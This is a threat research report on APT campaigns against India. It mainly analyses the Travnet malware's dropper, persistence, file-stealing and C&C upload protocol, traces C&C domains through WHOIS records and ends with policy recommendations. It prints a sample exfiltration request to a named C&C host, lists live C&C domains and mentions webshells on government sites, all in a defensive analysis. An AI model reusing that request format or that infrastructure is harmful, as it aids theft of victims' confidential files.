PART ONE: HUNTER OR HUNTED?
Attacks & Cyber threats against India
www.ResearchBundle.com

The recent ‘Operation Hangover’ report from Norman’s Malware
Detection Team has projected India as an emerging APT actor. The
report goes on to document a detailed analysis of targeted malware
and lists a small number of Indian-based companies that were
potentially threat actors involved in the campaign.
While the ‘Hangover’ report itself has been widely debated in the
Indian Information Security community, there is little proof, beyond
circumstantial evidence provided in the Norman report, that Indian
actors were behind this APT campaign, and the larger concern
remains that India is the victim of numerous APT campaigns, rather
than an instigator of this threat.
As our Government is rapidly migrating towards e-governance, it is
vital to ensure a robust approach to data security is implemented
from an early stage to prevent misuse and subsequent attacks on
critical infrastructure and the national economy. A quick look at
India's history with respect to battling cyber threats, reveals an ageold & on-going war between the “hackers” from various Nations. Defacement of Indian government sites date
back to the year 2003 & even today, they continue to happen.
In this report, we analyse the various facts and provide in-depth analysis of an “Advanced persistent threat” attack
on India that makes us ask – Are we the hunter or the hunted?

APT campaigns against India

“Advanced persistent threat” or APT as it is known, is a reality today. Unlike the regular script-kiddie attacks that
are carried out usually for fun or for fame, APTs are serious campaigns, undertaken by groups with a variety of
skill-sets. The focus of an APT campaign usually is to gather valuable information against specific companies /
organizations or selected sectors of a country. These usually begin with highly targeted spear-phishing attacks.

It’s not surprising to note that the threats are increasing at an alarming rate, year after year. In a way, it’s
heartening to observe the CERT evolve & rise upto newer challenges & latest threats.

Unfortunately, it’s not enough. The reports submitted by CERT do not take into account the most fundamental
aspects of maintaining a state of secure IT environment. This fact is evident from the number of security incidents
that happen over an year & how the right authorities react to them. If every reported incident was handled properly
by identifying the root cause, followed by a full security audit, we wonder if the numbers would grow so fast. As
mentioned earlier, cases of government sites being defaced date back to 2003. Even today, one can find servers
running older & vulnerable versions of software, poor server management, web applications deployed on these
servers being designed & implemented by programmers who lack awareness of secure coding practices, to name
a few. The private sector though, is much more cautious & alert when it comes to their IT infrastructure compared
to the government.

Attack on Indian IT Infrastructure: Zone-H Statistics

Let’s analyse the state of government's IT infrastructure in the following pages.
While the statistics presented by CERT-In looks alarming by itself, the actual state of domains that end with
“gov.in”, is much worse. A quick look at the following recent screenshot of www.zone-h.org site provides some
shocking insight. According to the site, the current statistics are as follows:
Total Notifications : 1299
Mass defacements : 753

PART TWO: ADVANCED PERSISTENT THREAT - ANALYSIS
The Travnet Case
A recent incident that caught our attention was the “Travnet” case. We carried out a preliminary analysis of our
own on the subject. Kaspersky as well as McAfee amongst others, have published detailed analysis of the malware
& the campaign.
Our focus was to understand the nature of the group behind the attack & its agenda. It began with Kaspersky's
revelation of the attack. We recommend you to go through Kaspersky & McAfee's analysis of the malware to know
more about the spear phishing campaign & the exploits used.
Our analysis is currently focussed only on the malware samples that are dropped on the target systems, as the
exploits used during the spear-phishing campaign are older & already patched by the respective vendors.
To summarize the modus operandi of the attack, targeted phishing mails were sent to individuals, having Office
documents as attachments. These documents exploited previously known vulnerabilities ( CVE-2012-0158 and
CVE-2010-3333 ) to drop “Travnet” malware onto the systems. Its fascinating to note that the attachments that
were sent to Indian targets were carefully selected & some of them were named as follows:



“Army Cyber Security Policy 2013.doc”



“Jallianwala bagh massacre a deeply shameful act.doc”



“Report - Asia Defense Spending Boom.doc”



“His Holiness the Dalai Lama’s visit to Switzerland day 3.doc”



“BJP won’t dump Modi for Nitish NDA headed for split.doc”

As its evident, the group behind the attack obviously has done extensive research on topics that are current as
well as intriguing to the Indian targets. We managed to acquired 2 variants of the “Travnet” malware & our
analysis of the same is as follows.

parameters, after decoding them.
After the configuration file is written, it checks if the malware was previously installed or not, if not, it creates a
dynamic-link library in the “system32” folder, creates a temporary batch file named as “temp.bat” which installs
the previous DLL as a service on the system. The name of the DLL that is created, is based upon the values of the
data from “netsvcs” from the following registry key : “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Svchost”. During this runtime, it turned out to be “6to4ex.dll” but it can change from runtime
to runtime.The malware then deletes the batch file. Its obvious that this executable basically acts as a dropper.
The contents of the batch file & the configuration file generated are as follows.

Batch file : temp.bat

Configuration file : config_t.dat

Now, as we know already, this DLL was installed as a service by the previous dropper. Analysis of the
“ServiceMain” function of the DLL throws light on many interesting things. The first thing it does upon execution
is to create a new mutex object named “NetTravler Is Running!”. Its usually done to avoid running multiple
instances of the same malware.

Next, it reads the configuration file.

Additionally, it also creates few interesting files in the “system32” folder.

The filenames are quite indicative of what their contents might be.

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security
“enumfs.ini” as the name suggests, is a complete list of all files and folders on the computer. “dnlist.ini” seems to
be noting down the date & time. “system_t.dll” on the other hand, contains a broad category of sensitive
information about the computer like the “Computer Name”, Windows version, IP address, list of running
processes, network information & so on. The contents of the files are as follows

Filename : “system_t.dll”

Upon proper character encoding & use of google's Translate feature, it turns out to be “Chinese”.

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Filename : “enumfs.ini”

Filename : “dnlist.ini”

Another interesting aspect of Travnet is that it can specifically search for files of the type “doc, docx, xls, xlsx, txt,
rtf, pdf” on the victim machine. This provides enough hint that this malware was designed to steal confidential
information unlike the usual botnet variants that focus primarily on providing remote access to the system or to
act as zombies for launching DDOS attacks.

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

To summarize, the Travnet malware initially collects system information, a list of files on the victim machine
among others, then sends this data to the remote Command & Control (C&C) server, by using custom
compression & encoding functions. The malware creates a new file with the naming convention as follows :
“travlerbackinfo-%d-%d-%d-%d-%d.dll”, where the signed integer values are replaced by the current system
date & time, copies the content of “system_t.dll” into it & then, uploads it to the C&C.

It also uploads the list of files found on the victim machine, which was saved in the “enumfs.ini” file to the remote
server, by copying its contents to a new file, named following this format:

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security
“FileList-%02u%02u-%02u%02u%02u.ini”

It doesn't stop at that, it even uploads the victim's files onto the remote C&C that have the file extensions “doc,
docx, xls, xlsx, txt, rtf, pdf” as well as the files on the victim's desktop folder. Another important aspect of Travnet
is the fact that it uses a custom compression & encoding algorithm on the data collected, before its sent to the
remote C&C. A typical file upload communication between the bot & the C&C looks like this:

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

An actual HTTP GET request looks like this:
“http://www.newesyahoo.com/traveler1/net/nettraveler.asp?hostid=00CD1A40&hostname=ComputerName&ho
stip=127.0.0.1&filename=FileList-0523131103.ini&filestart=0&filetext=begin::RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0
nIxm86m46D0YTg*::end”

Here, the data between “begin::” & “::end” is the actual file content, that was compressed & encoded by the bot.
It seems that this older variant of the Travnet malware supported 4 different types of commands from the
remote C&C and they are as follows:



UNINSTALL



UPDATE



RESET



UPLOAD

A quick analysis by PEiD reveals that the binary is not packed or protected.

This executable is apparently an updated variant of Travnet. The major changes are as follows:


It’s an executable & not a DLL.



The compression algorithm has been modified.



It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads.



Supports just 2 instructions from the C&C instead of 4, like in the previous version.

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Apart from these, there isn't much difference. The following analysis only focuses on what has changed.
It achieves persistence by copying itself to the currently logged-in user's “temp” folder as “csmss.exe” & placing
a shortcut to it, named as “seruvice.lnk” in the “startup” folder.

The next step it to create a new mutex object to avoid running multiple instances. It names the mutex as
“Assassin”.

After this, it generates a unique 8 characters long “hostid”, based on volume serial number to identify the bot.
This is common to the previous variant too.

Then it checks if the victim machine is connected to the internet or not, by trying to resolve “smtp.live.com” & if
that fails, as a second attempt, “smtp..yahoo.com”.

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

The strings displayed above, are actually in “Chinese” & turn out to be :


“You can connect to the network.”



"Unable to connect to the network."

Unlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine. It
just makes a list of all files & folders on the victim machine & dumps it into a file named as
“AllIndex.ini”. Next step is to compress the contents of this file, copy the compressed content to a new file named
as “AllIndex.ini_d” & then delete the previously created clear-text file. The contents of both the files are as
follows:
Filename : AllIndex.ini

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Filename : AllIndex.ini_d

It’s pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following
image:

Apart from that, this variant also creates a file that lists all the currently running processes on the victim machine,
into a text file named “Process.dll” inside the currently logged-on user's “temp” folder. This variant also uses a
modified naming convention to upload files onto the remote C&C. The only other major difference from the
previous variant is the fact that this one only supports 2 commands from the remote C&C server, instead of 4 &
they are as follows:



Uninstall



Upload

The C&C server in case of this variant was located at :
"http://www.viprambler.com/newsinfo/uld/nettraveler.asp"

Travnet Technical Analysis : Part C
Apart from analyzing the malware samples, we also tried to gather as much information about the C&C servers
as we could. The fact that even after a lot of research papers being published on the analysis of the Travnet
malware, some of the C&C servers are still active & functioning, is noteworthy. We were able to locate a few of
them. The ones that caught our attention are currently hosted on these domains :



www.pkspring.net



www.viprambler.com

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Let’s start with the analysis of “www.viprambler.com”.

WHOIS record for the domain currently is as follows:

Registrant information for the domain is as follows :

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Our analysis strongly suggests that the group behind Travnet might be from China. The above record is just one
of the findings that supports the claim. Its interesting to note that the domain was recently registered, is locked
& expires in 2014. Another interesting observation is the address of the registrant. “Guangdong” province from
China seems to pop up everywhere. Its also noteworthy that the domain is still active & still hosting the Travnet
C&C. We've also observed that the C&C now remains active only during specific time of the day. The time-stamp
from the images below, confirms this.

Active response from the C&C :

CERT-ISAC - India’s first independent CERT for mobile & electronic security

Its obvious that even after the discovery of the malware, the group behind this specific attack is determined to
keep it alive. The Travnet malware as well as its C&C infrastructure is constantly evolving. Lets move onto the
next active domain.
The Travnet C&C hosted at “pkspring.net” seems to be fully functional & active all the time. The response from
the server when opened from a browser is as follows:

Another interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server. They are as
follows:



80



443



8080

Its evident from the following pictures.

Port 443

Port 8080

Moving on, we found out that 21 domains are hosted on the same server at the moment. And all of them are
active C&C servers for the Travnet malware. They also seem to have interesting domain names. Its an indication
of the seriousness of the campaign.

Other domains hosted & owned by the same group on the same server/IP :

CERT-ISAC - India’s first independent CERT for mobile & electronic security

The image below proves that all of the above domains serve the same Travnet C&C on the same 3

ports, each.

After this, we focused our attention on the WHOIS details of these domains. At the moment, the details of the
registrant is kept private & it was recently updated. Its also interesting to note that the group behind this has
ensured that the domain cannot be taken over by someone else. The following page contains the current WHOIS
data for the domain.
“Pkspring.net”

Registrant details for the domain :

Nothing much to go on there at the moment. But thanks to older WHOIS records, we found out some interesting
facts.
The same domain was earlier registered as follows:

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security

It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013. The registrant's
information at that time was as follows:

The above data seems familiar. The only difference now being that the domains have be renewed, registration
details kept private & the email ID of the registrant has changed from “livep92@hotmail.com” to
“chenjm@sina.com”, which belongs to a private Chinese mail service (http://mail.sina.com.cn/) . The same thing

Powered by Po Anti-virus from www.researchbundle.com

CERT-ISAC - India’s first independent CERT for mobile & electronic security
has happened with other publicly disclosed Travnet C&C domains. We also fetched details of another domain
that previously hosted Travnet C&C & has been recently renewed, most likely by the same group.
A search for the email “livep92@hotmail.com” led us to the following page :

The above listed domains are already known to have hosted the Travnet C&C. We did some research on the
current status of one of the domains from the above list, “discoverypeace.org”. The current WHOIS data for the
domain “discoverypeace.org” is as follows:

This looks strikingly similar to the current status of the active C&C domain “pkstring.net”. It was also recently
updated. The older WHOIS entry for the same domain was as follows :

Conclusion of Travnet Analysis:
From our analysis of the Travnet malware so far, it’s quite evident that many things hint at the origin of this
campaign to be from China. It’s also a known fact the Indian government & other important sectors from India
were heavily targeted during this campaign. T
The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive
information makes it noteworthy.

PART THREE: PRIMARY CAUSES
What are the primary causes of weak Indian Cyber Space?

Use of Outdated Software on Government Websites
Another interesting finding is the fact that many of the servers that host “gov.in” sites are running outdated
software versions.

As an example, from the above image, it is evident that the domain “karnataka.gov.in” is hosted on a server running
“Windows Server 2003”, on 22-June-2013. To confirm this, we ran an nmap scan & it’s not surprising to find out
that the information is true. The screenshot of our nmap scan is as follows:

While use of outdated software is one of the major concerns, it seems most of the Indian government sites are
riddled with vulnerable code too. It’s quite common to locate webshells on these sites.

Webshells on Indian Websites
One of the many live webshells we found recently during our analysis is shown in the following image:

From the time-stamps on the above image, it’s evident that this is webshell is still active at the time of this this
writing. An example of a government site that’s not properly managed & discloses highly sensitive information is
as follows:

The above screenshot is just one of the many live examples of poorly managed web servers that do not follow
even the most basic web application security guidelines. Even important government sites, access to which can
lead to much deeper intrusion seem to be managed with little care. The following image is just one of the
examples of developing or customizing a CMS & not properly handling access-control.

While defacements are usually carried out by hackers just for fun or fame, in a way its a boon in disguise. Serious
hackers can cause much more damage & remain unnoticed for a very long time by having access to the
privileges these hackers abuse to deface the site. Slowly but steadily, serious APT campaigns are on the rise. Its
very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines
& practices. The next part of this research paper focuses on a recent APT campaign against multiple countries
including India was targeted.

While each and every technical cause for weak Indian Cyber space is beyond the scope of this document, we also
believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders
and Government departments in Information security to bring the much needed change.

PART FOUR: RECOMMENDATIONS
We recommend the following

Policy on Domain Name acquisition, management & maintenance

The Domain name acquisition, management and maintenance policy should address the process to protect and
manage the crucial online identities of Indian Government Domains. At present there is no consistent policy to
acquire and manage the domains. The policy should address:
1.
2.
3.
4.
5.

Naming convention to be followed for official Government domains to prevent misuse by domain
squatters
A Government body that is responsible to register, administer and manage the domains
Consistent working administrative and management contacts for WHOIS query
Systematic policy to acquire domains and renew them on timely basis
A policy to ensure “Domain Authorization keys” are managed properly and maintained in proper chain of
custody, secured in a bank locker and handled with systematic process

Policy on Vendor qualification for secure website development

It is crucial to select the right vendors for developing security websites and web applications for all Government
projects. The policy should address:
1.
2.
3.
4.
5.

Qualification parameters for selection of vendor for web site and web application development
Certified Staff by vendor working on Government projects for Information security and secure coding
Quarterly vulnerability assessment and penetration testing of all websites
Security Classification of websites that determine parameters of vendor approval
Comprehensive development and support contract from vendor that covers data security and associated
penalties in event of breach

Policy on Patch Management
While it is possible that such a policy exits with organizations such as NIC, it is important to ensure these are
implemented in a timely manner. The policy on patch management must ensure outdated software must be
secured appropriately and updated as per Industry standards. The policy must address:
1.
2.
3.
4.
5.

Adequate test bed environment for testing new updates for software, patches etc
Comprehensive UAT (User Acceptance Testing) before implementation of critical security patches
Policy to ensure critical security updates are deployed within a specified time from date of release
Backup of data and roll back methodologies in event of patch deployment issues
Monitoring of critical updates and patches and appropriate classification of the same for deployment

Policy, Process and Guidelines on Full disclosures
India has a strong community of Information security experts who can support the Indian Government and
strengthen overall security of our cyber space. As the nature of such community is dynamic and rapidly evolving, it is
important for the Indian Government to setup a policy and process for responsible full disclosures when Indian
citizens report possible vulnerabilities in critical digital assets of India. These must address:
1. Process by which any citizen of India can safely submit and report vulnerabilities, full disclosures in Indian
websites to an authorized agency without fearing action of IT Act law
2. Guidelines under which, the security experts from the Indian community can communicate, assist and
support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber
space.
3. Process to act on security incidents reported by the security community in a timely manner.
4. Guidelines to industry at large on how to cooperate with security experts who disclose security issues in
their organizations
5. Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy
of the country from malicious hackers

Role of National Security Database
National Security Database (NSD) is a prestigious empanelment program awarded to credible & trustworthy
Information security experts with proven skills to protect the National Critical Infrastructure & economy of the
country.
The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been
playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community
in improving the overall cyber space of India.
We sincerely believe that in coming years, the program will create a strong and credible cyber workforce that can
help the Indian Government in both offense and defence of its Cyber Space.
